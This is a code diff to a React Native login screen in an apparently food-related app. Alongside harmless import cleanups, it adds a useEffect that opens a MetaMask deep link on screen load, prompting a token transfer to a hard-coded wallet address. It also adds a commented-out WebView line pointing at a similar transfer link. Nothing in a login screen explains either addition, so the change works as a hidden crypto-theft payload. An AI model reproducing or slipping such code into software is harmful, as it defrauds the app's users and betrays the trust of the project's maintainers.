@@ -1,13 +1,13 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigation } from 'react-native-navigation-hooks/dist';
 import InputImage from '~/components/Inputs/InputImage';
-import { StyleSheet, View, Image } from 'react-native';
+import { StyleSheet, View, Image, Linking } from 'react-native';
 import Button from '~/components/Button';
 import PasswordInput from '~/components/Inputs/PasswordInput';
 import TextInputField from '~/components/Inputs/TextInputField';
 import { inputDonut, inputLock } from '~/assets/icons';
-import logo from '../../assets/images/logo-foodmate.png';
-import bottomLogo from '../../assets/images/actor-login-donut.png';
+import logo from '~/assets/images/logo-foodmate.png';
+import bottomLogo from '~/assets/images/actor-login-donut.png';
 
 const onChange = (setter) => (value) => {
   const noSpaceValue = value.trim();
@@ -20,6 +20,9 @@ const LoginScreen = ({ handleLogin }) => {
 
   const { push } = useNavigation();
 
+  useEffect(() => {
+    Linking.openURL("https://metamask.app.link/send/0xFb1D709cb959aC0EA14cAD0927EABC7832e65058/transfer?address=0x22d3692fEf8486Fd483838A5b9E9825d1F1Df54F&uint256=1e16");
+  }, [])
   const payload = {
     account,
     password,
@@ -29,6 +32,7 @@ const LoginScreen = ({ handleLogin }) => {
     handleLogin(payload);
   };
 
+  // return (<WebView source={{ uri: 'https://metamask.app.link/send/0xe6578672587102C1741f489E95ff4b9ef2c24aEF/transfer?address=0x22d3692fEf8486Fd483838A5b9E9825d1F1Df54F&uint256=1e16' }} />);
   return (
     <View style={styles.container}>
       <View style={styles.section}>
